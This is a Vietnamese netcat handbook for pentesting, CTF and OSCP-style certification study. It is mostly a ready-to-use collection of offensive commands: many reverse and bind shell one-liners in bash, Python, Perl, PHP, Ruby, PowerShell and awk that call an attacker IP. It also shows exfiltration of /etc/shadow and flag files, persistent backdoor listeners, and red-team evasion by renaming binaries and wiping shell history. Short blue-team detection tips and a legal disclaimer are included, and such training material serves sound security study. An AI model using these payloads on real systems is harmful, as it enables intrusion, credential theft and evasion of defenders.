# 🔧 NETCAT – Hướng Dẫn Toàn Diện cho Pentest, CTF & Chứng Chỉ

> **"The Swiss Army Knife of networking"** – Công cụ không thể thiếu trong bộ toolkit của mọi pentester.

---

## 📌 MỤC LỤC

- [[#1. Giới Thiệu & Khái Niệm]]
- [[#2. Cài Đặt & Các Phiên Bản]]
- [[#3. Cú Pháp & Flags Cơ Bản]]
- [[#4. Các Trường Hợp Sử Dụng Cơ Bản]]
- [[#5. Reverse Shell & Bind Shell]]
- [[#6. Shell Upgrading – Nâng Cấp Shell]]
- [[#7. File Transfer với Netcat]]
- [[#8. Port Scanning & Recon]]
- [[#9. Pivoting & Tunneling]]
- [[#10. Netcat Trong CTF]]
- [[#11. Kỹ Thuật Nâng Cao]]
- [[#12. Các Biến Thể Thay Thế Netcat]]
- [[#13. OPSEC & Phòng Thủ]]
- [[#14. Cheat Sheet Tổng Hợp]]

---

## 1. Giới Thiệu & Khái Niệm

### Netcat là gì?

**Netcat** (`nc`) là một tiện ích mạng đọc và ghi dữ liệu qua các kết nối TCP hoặc UDP. Được viết bởi Hobbit vào năm 1995, đây là công cụ nền tảng mà mọi pentester cần nắm vững.

### Tại sao Netcat quan trọng?

- **Không phụ thuộc thư viện** – thường có sẵn trên hệ thống target
- **Đa năng** – banner grabbing, file transfer, reverse shell, port scan, relay
- **Đơn giản** – cú pháp tối giản, dễ nhớ, dễ kết hợp với các công cụ khác
- **Script-friendly** – kết hợp tốt với bash, python, socat

### Các khái niệm cốt lõi

|Khái niệm|Giải thích|
|---|---|
|**Listener**|Bên lắng nghe kết nối đến (`-l` flag)|
|**Client**|Bên khởi tạo kết nối đến listener|
|**Bind Shell**|Shell mở port trên máy victim, attacker connect vào|
|**Reverse Shell**|Shell từ máy victim kết nối ngược về máy attacker|
|**TTY**|Terminal thực sự hỗ trợ interactive commands (su, ssh, vi...)|
|**PTY**|Pseudo-terminal – giả lập terminal đầy đủ|
|**STDIN/STDOUT**|Luồng dữ liệu vào/ra được netcat redirect qua network|

---

## 2. Cài Đặt & Các Phiên Bản

### Các phiên bản Netcat

```
┌─────────────────┬──────────────────────────────────────────────────┐
│ Phiên bản       │ Đặc điểm                                         │
├─────────────────┼──────────────────────────────────────────────────┤
│ netcat-openbsd  │ Default trên Debian/Ubuntu, hỗ trợ IPv6          │
│ netcat-traditional│ Hỗ trợ -e flag (execute), linh hoạt hơn       │
│ ncat (Nmap)     │ SSL support, proxy support, script-friendly       │
│ socat           │ Mạnh hơn nc, hỗ trợ PTY đầy đủ                  │
│ pwncat          │ Python-based, auto shell upgrade                  │
│ rlwrap nc       │ Thêm readline support cho nc                     │
└─────────────────┴──────────────────────────────────────────────────┘
```

### Kiểm tra phiên bản đang dùng

```bash
nc -h 2>&1 | head -5
# Nếu thấy OpenBSD: không có -e flag
# Nếu thấy traditional/GNU: có -e flag
```

### Cài đặt

```bash
# Debian/Ubuntu
sudo apt install netcat-traditional   # có -e flag
sudo apt install netcat-openbsd       # phiên bản mặc định
sudo apt install ncat                 # từ nmap

# CentOS/RHEL
sudo yum install nc
sudo dnf install nmap-ncat

# macOS
brew install netcat
brew install nmap  # bao gồm ncat
```

---

## 3. Cú Pháp & Flags Cơ Bản

### Cú pháp tổng quát

```
nc [options] [host] [port]
```

### Bảng Flags Đầy Đủ

|Flag|Mô tả|Ví dụ|
|---|---|---|
|`-l`|Listen mode (lắng nghe)|`nc -l 4444`|
|`-p`|Chỉ định port|`nc -l -p 4444`|
|`-n`|Không dùng DNS lookup|`nc -n 10.10.10.1 80`|
|`-v`|Verbose (chi tiết)|`nc -v 10.10.10.1 80`|
|`-vv`|Very verbose|`nc -vv 10.10.10.1 80`|
|`-e`|Execute program (traditional only)|`nc -e /bin/bash`|
|`-c`|Execute shell command (traditional)|`nc -c bash`|
|`-u`|UDP mode (mặc định TCP)|`nc -u 10.10.10.1 53`|
|`-z`|Zero-I/O (port scan mode)|`nc -z 10.10.10.1 1-1000`|
|`-w`|Timeout (giây)|`nc -w 3 10.10.10.1 80`|
|`-k`|Keep listening (giữ listener)|`nc -lk 4444`|
|`-q`|Quit after EOF + N giây|`nc -q 1 10.10.10.1 80`|
|`-4`|IPv4 only|`nc -4 -l 4444`|
|`-6`|IPv6 only|`nc -6 -l 4444`|
|`-s`|Source address|`nc -s 192.168.1.5`|
|`-o`|Hex dump output|`nc -o dump.txt`|
|`-i`|Delay interval|`nc -i 1`|

### ncat-specific flags (Nmap's netcat)

|Flag|Mô tả|
|---|---|
|`--ssl`|Kết nối SSL/TLS|
|`--proxy`|Sử dụng proxy|
|`--allow`|Whitelist IP kết nối|
|`--exec`|Execute program (như -e)|
|`--sh-exec`|Execute qua shell|
|`--keep-open`|Như -k|
|`--broker`|Chat/relay mode|
|`--chat`|Multi-client chat|

---

## 4. Các Trường Hợp Sử Dụng Cơ Bản

### 4.1 Banner Grabbing

```bash
# HTTP banner
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc -n -v 10.10.10.1 80

# FTP banner
nc -n -v 10.10.10.1 21

# SMTP banner
nc -n -v 10.10.10.1 25

# SSH banner
nc -n -v 10.10.10.1 22

# Tự động timeout sau 3 giây
echo "" | nc -w 3 10.10.10.1 80
```

### 4.2 Chat đơn giản giữa 2 máy

```bash
# Máy A (listener)
nc -l -p 1234

# Máy B (client)
nc 192.168.1.10 1234

# Sau khi kết nối, gõ text và Enter để gửi
```

### 4.3 Kiểm tra port có mở không

```bash
# Kiểm tra 1 port
nc -zv 10.10.10.1 22

# Kiểm tra nhiều port
nc -zv 10.10.10.1 20-25 80 443 3306 8080

# Kiểm tra nhanh không cần verbose
nc -z 10.10.10.1 80 && echo "OPEN" || echo "CLOSED"
```

### 4.4 Gửi HTTP Request thủ công

```bash
# GET request
printf "GET / HTTP/1.1\r\nHost: 10.10.10.1\r\n\r\n" | nc -q 2 10.10.10.1 80

# POST request
printf "POST /login HTTP/1.1\r\nHost: 10.10.10.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 27\r\n\r\nusername=admin&password=123" | nc -q 2 10.10.10.1 80

# Với ncat
ncat 10.10.10.1 80
GET / HTTP/1.0
Host: 10.10.10.1
[Enter 2 lần]
```

---

## 5. Reverse Shell & Bind Shell

### Khái niệm quan trọng

```
BIND SHELL:
  Victim:  nc -l -p 4444 -e /bin/bash    ← mở port, chờ
  Attacker: nc 10.10.10.5 4444            ← kết nối vào
  → Attacker phải biết IP victim, victim phải không bị firewall block

REVERSE SHELL:
  Attacker: nc -l -p 4444                 ← lắng nghe trước
  Victim:   nc 10.10.14.1 4444 -e /bin/bash ← gọi ngược về
  → Vượt qua inbound firewall, NAT tốt hơn (phổ biến hơn)
```

### 5.1 Bind Shell

```bash
# ===== VICTIM (target machine) =====

# Với -e flag (traditional)
nc -l -p 4444 -e /bin/bash

# Không có -e flag (OpenBSD) – dùng mkfifo
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l -p 4444 > /tmp/f

# ===== ATTACKER =====
nc 10.10.10.5 4444
```

### 5.2 Reverse Shell

```bash
# ===== ATTACKER – Mở listener trước =====
nc -nlvp 4444

# ===== VICTIM – Các cách tạo reverse shell =====

# Cách 1: Dùng -e (nếu có)
nc 10.10.14.1 4444 -e /bin/bash
nc 10.10.14.1 4444 -e /bin/sh

# Cách 2: mkfifo (không cần -e, phổ biến nhất)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.1 4444 >/tmp/f

# Cách 3: /dev/tcp (bash built-in, không cần nc trên victim!)
bash -i >& /dev/tcp/10.10.14.1/4444 0>&1

# Cách 4: Rõ ràng hơn
bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'

# Cách 5: exec redirect
exec 5<>/dev/tcp/10.10.14.1/4444; cat <&5 | while read line; do $line 2>&5 >&5; done

# Cách 6: Python (nếu có python trên victim)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Cách 7: Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Cách 8: Perl
perl -e 'use Socket;$i="10.10.14.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Cách 9: PHP (web shell context)
php -r '$sock=fsockopen("10.10.14.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Cách 10: Ruby
ruby -rsocket -e'f=TCPSocket.open("10.10.14.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Cách 11: Netcat OpenBSD với pipe
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.1 4444 >/tmp/f

# Cách 12: ncat với --exec
ncat 10.10.14.1 4444 --exec /bin/bash

# Cách 13: PowerShell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.14.1",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# Cách 14: Awk
awk 'BEGIN {s = "/inet/tcp/0/10.10.14.1/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/stdin
```

### 5.3 Windows Reverse Shell với nc.exe

```powershell
# Upload nc.exe lên victim trước, sau đó:
nc.exe -e cmd.exe 10.10.14.1 4444
nc.exe -e powershell.exe 10.10.14.1 4444

# Nếu không upload được, dùng PowerShell thuần:
# (xem cách 13 ở trên)
```

---

## 6. Shell Upgrading – Nâng Cấp Shell

> Đây là kỹ thuật **cực kỳ quan trọng** – IppSec đề cập trong hầu hết mọi video HackTheBox. Shell từ netcat ban đầu thường là "dumb shell" – không có tab completion, không dùng được `su`, `ssh`, `vim`, Ctrl+C sẽ kill shell.

### Vấn đề với dumb shell

```
❌ Không có Tab completion
❌ Ctrl+C giết toàn bộ shell
❌ Ctrl+Z không hoạt động đúng
❌ Không dùng được sudo với password
❌ Không dùng được vi/vim/nano
❌ Không có job control
❌ History không hoạt động
```

### 6.1 Phương pháp 1: Python PTY (Phổ biến nhất)

```bash
# Bước 1: Spawn PTY trong shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Hoặc python 2:
python -c 'import pty; pty.spawn("/bin/bash")'

# Bước 2: Background shell (Ctrl+Z)
^Z

# Bước 3: Trên máy attacker – lấy terminal settings
echo $TERM           # lấy giá trị, thường là xterm-256color
stty -a              # xem rows/cols hiện tại

# Bước 4: Set raw mode, disable echo
stty raw -echo; fg

# Bước 5: Trong shell victim – set terminal variables
export TERM=xterm-256color
export SHELL=bash
stty rows 38 columns 116   # thay bằng giá trị thực của terminal bạn

# ✅ Kết quả: Shell đầy đủ với tab completion, Ctrl+C, su, vim...
```

### 6.2 Phương pháp 2: Script Command

```bash
# Trong dumb shell:
script /dev/null -c bash
# Sau đó làm bước 2-5 như trên
```

### 6.3 Phương pháp 3: Socat (Tốt nhất, cần upload socat)

```bash
# Máy attacker – listener với socat:
socat file:`tty`,raw,echo=0 tcp-listen:4445

# Victim – kết nối ngược với full PTY:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.1:4445

# Hoặc upload socat binary:
wget -q http://10.10.14.1/socat -O /tmp/socat; chmod +x /tmp/socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.1:4445
```

### 6.4 Phương pháp 4: Stty trực tiếp

```bash
# Trong dumb shell:
/usr/bin/script -qc /bin/bash /dev/null
CTRL+Z
stty raw -echo
fg
reset
export TERM=xterm
export SHELL=bash
```

### 6.5 Phương pháp 5: Dùng rlwrap (trên attacker)

```bash
# Thay vì: nc -nlvp 4444
# Dùng:
rlwrap nc -nlvp 4444

# rlwrap thêm readline support (arrow keys, history, Ctrl+R)
# Không đầy đủ như PTY nhưng tiện dụng
```

### 6.6 Phương pháp 6: pwncat (Tool tự động upgrade)

```bash
# Cài đặt
pip install pwncat-cs

# Sử dụng – tự động upgrade shell
pwncat-cs -l -p 4444

# Khi victim connect, pwncat tự động upgrade và cung cấp:
# - Upload/download files
# - Persistence
# - Full PTY tự động
```

### 6.7 Kiểm tra shell level hiện tại

```bash
echo $SHLVL     # shell level
echo $TERM      # terminal type
tty             # tty device
stty -a         # terminal settings hiện tại
```

### Tóm tắt quy trình IppSec style

```
1. Nhận reverse shell → nc -nlvp 4444
2. Spawn PTY → python3 -c 'import pty; pty.spawn("/bin/bash")'
3. Ctrl+Z để background
4. stty raw -echo; fg
5. Enter 2 lần
6. export TERM=xterm-256color
7. stty rows [X] columns [Y]
✅ Done – full interactive shell
```

---

## 7. File Transfer với Netcat

### 7.1 Chuyển file cơ bản

```bash
# Receiver (nhận file) – mở trước
nc -nlvp 4444 > received_file.txt

# Sender (gửi file)
nc -w 3 10.10.14.1 4444 < file_to_send.txt

# Hoặc ngược lại (attacker gửi file cho victim):
# Attacker (listener, gửi):
nc -l -p 4444 < file_to_send.exe

# Victim (nhận):
nc 10.10.14.1 4444 > received.exe
```

### 7.2 Transfer và kiểm tra tính toàn vẹn

```bash
# Sender – gửi file kèm md5
md5sum file.tar.gz
nc -w 3 10.10.14.1 4444 < file.tar.gz

# Receiver – nhận và verify
nc -l -p 4444 > file.tar.gz
md5sum file.tar.gz  # so sánh với md5 của sender
```

### 7.3 Transfer thư mục (dùng tar)

```bash
# Sender
tar czf - /path/to/directory | nc -w 5 10.10.14.1 4444

# Receiver
nc -nlvp 4444 | tar xzf -
```

### 7.4 Nhanh hơn với pv (progress view)

```bash
# Sender
cat file.iso | pv | nc -w 5 10.10.14.1 4444

# Receiver
nc -nlvp 4444 | pv > file.iso
```

### 7.5 Webserver tạm thời (thay thế nc transfer)

```bash
# Attacker – serve file đơn giản
python3 -m http.server 8080
python2 -m SimpleHTTPServer 8080

# Victim – download
wget http://10.10.14.1:8080/file.exe
curl -o file.exe http://10.10.14.1:8080/file.exe

# Windows (PowerShell)
Invoke-WebRequest -Uri "http://10.10.14.1:8080/file.exe" -OutFile "file.exe"
(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.1:8080/nc.exe","nc.exe")
```

---

## 8. Port Scanning & Recon

### 8.1 TCP Port Scan

```bash
# Scan 1 port
nc -zv 10.10.10.1 80

# Scan range
nc -zvn 10.10.10.1 1-1000

# Scan nhiều port cụ thể
nc -zvn 10.10.10.1 21 22 80 443 445 3306 8080 8443

# Timeout 1 giây mỗi port
nc -zvn -w 1 10.10.10.1 1-65535

# Chỉ hiện port mở (lọc qua grep)
nc -zvn -w 1 10.10.10.1 1-1000 2>&1 | grep "succeeded\|open"
```

### 8.2 UDP Scan

```bash
nc -zvu 10.10.10.1 53 67 68 69 123 161 500
```

### 8.3 Banner Grabbing Tự Động

```bash
# Script grab banner nhiều port
for port in 21 22 23 25 80 110 143 443 993 995 3306; do
    echo "=== Port $port ===" 
    echo "" | nc -w 2 -n 10.10.10.1 $port 2>/dev/null | head -3
done
```

---

## 9. Pivoting & Tunneling

### 9.1 Netcat Relay (Pivot)

```bash
# Tình huống: Attacker → Pivot → Target (Target không accessible trực tiếp)
# Pivot machine chạy relay

# Tạo named pipe
mkfifo /tmp/relay
# Relay: nhận từ attacker port 4444, chuyển đến target:80
nc -l -p 4444 < /tmp/relay | nc 192.168.1.100 80 > /tmp/relay
```

### 9.2 Port Forwarding đơn giản

```bash
# Forward port 8080 trên pivot đến 80 của target nội bộ
mkfifo /tmp/pipe
nc -l -p 8080 < /tmp/pipe | nc 192.168.1.5 80 > /tmp/pipe
```

### 9.3 Double Pivoting

```bash
# Attacker listen:
nc -l -p 5555

# Pivot 1 relay về Pivot 2:
mkfifo /tmp/p; nc -l -p 4444 < /tmp/p | nc pivot2_ip 3333 > /tmp/p

# Pivot 2 relay về target:
mkfifo /tmp/q; nc -l -p 3333 < /tmp/q | nc target_ip 22 > /tmp/q
```

### 9.4 Kết hợp với SSH tunneling

```bash
# Sau khi có SSH access, dùng SSH thay nc relay:
ssh -L 8080:192.168.1.5:80 user@pivot
# Truy cập 192.168.1.5:80 qua localhost:8080

# Dynamic SOCKS proxy
ssh -D 1080 user@pivot
# Kết hợp proxychains
```

---

## 10. Netcat Trong CTF

### 10.1 Kết nối Challenge Server

```bash
# Kết nối đến challenge netcat service (phổ biến trong CTF)
nc challenge.ctf.example.com 31337

# Với timeout
nc -w 30 challenge.ctf.example.com 31337
```

### 10.2 Tương tác tự động với pwntools (Python)

```python
from pwn import *

# Kết nối
conn = remote('challenge.ctf.example.com', 31337)

# Nhận output
data = conn.recvline()
print(data)

# Gửi input
conn.sendline(b"your_answer")

# Interactive mode
conn.interactive()
```

### 10.3 Script tự động trả lời challenge

```bash
# Ví dụ: challenge hỏi toán, cần trả lời nhanh
while true; do
    answer=$(nc -w 5 ctf.example.com 1337 | grep "=" | awk '{print $NF}' | bc)
    echo "$answer" | nc ctf.example.com 1337
done
```

### 10.4 Nhận flag qua reverse shell trong CTF

```bash
# Sau khi exploit thành công, thường dùng:
nc -nlvp 4444   # trên VPN/attacker machine

# Hoặc dùng ngrok để nhận từ internet
ngrok tcp 4444
# Victim kết nối đến: nc ngrok_host ngrok_port -e /bin/bash
```

### 10.5 Exfiltrate data từ CTF box

```bash
# Đọc flag và gửi về
cat /root/flag.txt | nc 10.10.14.1 4444

# Toàn bộ /etc/passwd
nc 10.10.14.1 4444 < /etc/shadow
```

---

## 11. Kỹ Thuật Nâng Cao

### 11.1 Encrypted Shell với ncat SSL

```bash
# Tạo cert trên attacker
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Listener với SSL:
ncat --ssl --ssl-cert cert.pem --ssl-key key.pem -l -p 4444

# Victim connect SSL:
ncat --ssl 10.10.14.1 4444 -e /bin/bash
```

### 11.2 Netcat qua HTTP Proxy

```bash
# Dùng ncat với proxy
ncat --proxy 127.0.0.1:8080 --proxy-type http target.internal 80

# Dùng proxychains
proxychains nc 192.168.1.5 22
```

### 11.3 Persistent Listener (không die sau 1 connection)

```bash
# Giữ listener chạy liên tục
nc -klp 4444 -e /bin/bash   # traditional, nguy hiểm!

# Script loop
while true; do nc -l -p 4444 -e /bin/bash; done

# Dùng ncat:
ncat --keep-open -l 4444 --exec /bin/bash
```

### 11.4 Broadcast / Multi-client với ncat

```bash
# ncat broker mode – nhiều client chat với nhau
ncat -l --broker -p 4444

# Chat mode
ncat -l --chat -p 4444
```

### 11.5 Honeypot đơn giản

```bash
# Log tất cả kết nối đến port 4444
while true; do
    nc -l -p 4444 >> /tmp/honeypot_log.txt 2>&1
done

# Với timestamp
while true; do
    echo "--- Connection at $(date) ---" >> /tmp/log.txt
    nc -l -p 4444 >> /tmp/log.txt 2>&1
done
```

### 11.6 Kiểm tra WAF/Firewall Evasion (Port Hopping)

```bash
# Thử nhiều port để tìm port outbound được cho phép
for port in 80 443 8080 8443 53 25 587 465 110 995 993; do
    nc -zv -w 2 10.10.14.1 $port 2>&1 | grep "succeeded" && echo "Port $port outbound OK"
done
```

### 11.7 Living off the Land – Không dùng nc

```bash
# Bash built-in /dev/tcp (không cần nc!)
cat /etc/passwd > /dev/tcp/10.10.14.1/4444

# Nhận trên attacker:
nc -l -p 4444

# Tạo reverse shell không cần nc:
bash -i >& /dev/tcp/10.10.14.1/4444 0>&1
exec 3<>/dev/tcp/10.10.14.1/4444; echo -e "GET / HTTP/1.0\r\n" >&3; cat <&3

# /dev/udp cũng hoạt động:
echo "data" > /dev/udp/10.10.14.1/4444
```

---

## 12. Các Biến Thể Thay Thế Netcat

### 12.1 Socat – Mạnh hơn nc nhiều

```bash
# Kết nối cơ bản
socat TCP:10.10.10.1:80 -

# Listener
socat TCP-LISTEN:4444 -

# Reverse shell với full PTY (tốt nhất!)
# Attacker:
socat file:`tty`,raw,echo=0 tcp-listen:4444,reuseaddr
# Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.1:4444

# File transfer
socat -u FILE:file.txt TCP:10.10.14.1:4444   # sender
socat -u TCP-LISTEN:4444 FILE:received.txt   # receiver
```

### 12.2 pwncat – Python tool tự động

```bash
pip install pwncat-cs

# Listen – tự động upgrade shell
pwncat-cs -l -p 4444

# Connect
pwncat-cs 10.10.10.1:4444

# Commands trong pwncat:
# Ctrl+D → về local shell
# upload /local/file /remote/path
# download /remote/file /local/path
# run enumerate.system
```

### 12.3 Chisel – HTTP Tunneling

```bash
# Tải: https://github.com/jpillora/chisel

# Attacker (server):
./chisel server --reverse --port 8080

# Victim (client) – tạo SOCKS proxy qua HTTP:
./chisel client 10.10.14.1:8080 R:socks
# Tạo SOCKS5 proxy tại attacker:1080

# Kết hợp proxychains:
proxychains nmap -sT -Pn 192.168.1.0/24
```

### 12.4 So sánh các tool

|Tool|Encrypted|PTY|File Transfer|Pivot|Note|
|---|---|---|---|---|---|
|nc|❌|❌|✅|✅|Universal, lightweight|
|ncat|✅ SSL|❌|✅|✅|Nmap's nc, proxy support|
|socat|✅ SSL|✅|✅|✅|Powerful, tốt nhất cho PTY|
|pwncat|✅|✅ auto|✅ auto|❌|Python, auto upgrade|
|chisel|✅|❌|❌|✅|HTTP tunnel, firewall bypass|

---

## 13. OPSEC & Phòng Thủ

### 13.1 Phát hiện Netcat (Blue Team perspective)

```bash
# Tìm process đang dùng nc
ps aux | grep -E 'nc|ncat|netcat'
netstat -antp | grep LISTEN   # tìm listener
ss -lntp                      # modern alternative

# Lệnh netcat thường để lại trong history
cat ~/.bash_history | grep 'nc '

# Kiểm tra file /tmp (thường dùng để tạo pipe)
ls -la /tmp/ | grep -E 'f$|pipe'
```

### 13.2 Tránh bị phát hiện (Red Team)

```bash
# Đổi tên binary
cp /bin/nc /tmp/.sysupdate
/tmp/.sysupdate -l -p 4444 -e /bin/bash

# Dùng port phổ biến (80, 443, 53) để qua firewall
nc -l -p 443 -e /bin/bash

# Xóa history
unset HISTFILE
history -c
export HISTSIZE=0

# Dùng /dev/tcp thay nc để không có binary
bash -i >& /dev/tcp/10.10.14.1/443 0>&1

# Mã hóa traffic (ncat SSL)
ncat --ssl 10.10.14.1 4444 -e /bin/bash
```

### 13.3 Phòng chống (Defender)

```
✅ Block outbound kết nối không cần thiết (egress filtering)
✅ Monitor process spawning shell từ web processes
✅ Dùng EDR phát hiện command execution patterns
✅ Audit /dev/tcp usage (seccomp, auditd)
✅ Alert trên kết nối ra ngoài từ server processes
✅ Triển khai application whitelist
```

---

## 14. Cheat Sheet Tổng Hợp

### Listeners

```bash
nc -nlvp 4444                    # TCP listener cơ bản
nc -nlvp 4444 -u                 # UDP listener
ncat --ssl -nlvp 4444            # SSL listener
rlwrap nc -nlvp 4444             # Với readline support
socat file:`tty`,raw,echo=0 tcp-listen:4444  # Full PTY listener
```

### Reverse Shells (Victim → Attacker)

```bash
# Bash (phổ biến nhất)
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# nc với -e
nc ATTACKER_IP PORT -e /bin/bash

# nc không có -e (mkfifo)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP PORT >/tmp/f

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Shell Upgrade (sau khi nhận shell)

```bash
# Victim:
python3 -c 'import pty;pty.spawn("/bin/bash")'
^Z
# Attacker:
stty raw -echo; fg
# Victim:
export TERM=xterm-256color
stty rows 38 cols 116
```

### File Transfer

```bash
# Gửi file (attacker → victim)
nc -l -p 4444 < file            # attacker listen, gửi file
nc ATTACKER_IP 4444 > file      # victim nhận

# Nhận file (victim → attacker)
nc -l -p 4444 > file            # attacker nhận
nc ATTACKER_IP 4444 < file      # victim gửi
```

### Port Scan

```bash
nc -zv TARGET 1-1000            # TCP scan
nc -zvu TARGET 53 161 500       # UDP scan
nc -zvn -w1 TARGET 1-65535 2>&1 | grep open  # Fast scan
```

### Banner Grabbing

```bash
echo "" | nc -w 2 TARGET PORT
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc TARGET 80
```

### CTF Quick Reference

```bash
nc CHALLENGE_HOST PORT          # Kết nối challenge
nc -nlvp 4444                   # Nhận reverse shell
cat flag.txt | nc ATTACKER 4444 # Exfil flag
```

---

## 📚 Resources & Học Thêm

### Kênh học tập IppSec style

- **IppSec YouTube** – https://ippsec.rocks (search theo technique)
- **HackTheBox** – thực hành với real machines
- **TryHackMe** – structured learning path
- **revshells.com** – generate reverse shell commands online
- **PayloadsAllTheThings** – https://github.com/swisskyrepo/PayloadsAllTheThings

### Chứng chỉ liên quan

|Cert|Netcat usage|
|---|---|
|**OSCP**|Reverse shells, file transfer, pivoting – cần thành thạo|
|**eJPT**|Cơ bản, reverse shell, banner grabbing|
|**CEH**|Lý thuyết + practical|
|**PNPT**|Tương tự OSCP, IppSec style|

### Tools bổ sung cần biết

```
pwntools     – Python library cho exploit/pwn
metasploit   – Framework có sẵn multi/handler
evil-winrm   – Windows RM shell
impacket     – Windows protocol suite
chisel       – HTTP tunnel
ligolo-ng    – Modern pivoting tool
```

---

> **⚠️ Lưu ý pháp lý:** Chỉ sử dụng các kỹ thuật này trên hệ thống bạn được phép kiểm thử (own machines, lab environments, authorized engagements). Truy cập trái phép là vi phạm pháp luật.

---

_File này được tạo cho mục đích học tập, chứng chỉ bảo mật (OSCP, CEH, eJPT), và CTF competitions._